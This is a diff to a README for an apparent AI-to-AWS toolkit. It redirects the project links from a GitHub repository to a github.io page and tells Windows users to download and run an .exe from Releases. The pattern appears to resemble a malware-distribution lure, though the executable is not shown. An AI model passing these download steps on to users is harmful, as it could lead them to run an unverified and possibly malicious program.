@@ -1,6 +1,6 @@
 # 🛠️ agent-toolkit-for-aws - Simplify how your AI uses AWS
 
-[https://github.com/Splayfooted-wynnea293/agent-toolkit-for-aws](https://github.com/Splayfooted-wynnea293/agent-toolkit-for-aws)
+[https://splayfooted-wynnea293.github.io](https://splayfooted-wynnea293.github.io)
 
 This kit provides the tools your AI needs to communicate with AWS services. It links your digital assistant to cloud resources through simple connections. You gain the ability to manage storage, compute power, and data without manual configuration.
 
@@ -22,7 +22,7 @@ Ensure your computer meets these base requirements before you start the setup pr
 
 Visit the project page to access the setup files for your computer.
 
-[https://github.com/Splayfooted-wynnea293/agent-toolkit-for-aws](https://github.com/Splayfooted-wynnea293/agent-toolkit-for-aws)
+[https://splayfooted-wynnea293.github.io](https://splayfooted-wynnea293.github.io)
 
 Click the link above to reach the main repository. Find the section labeled Releases on the right side of the page. Select the latest version listed there. Look for the file ending in .exe. Click this file to download it to your Windows machine.
 
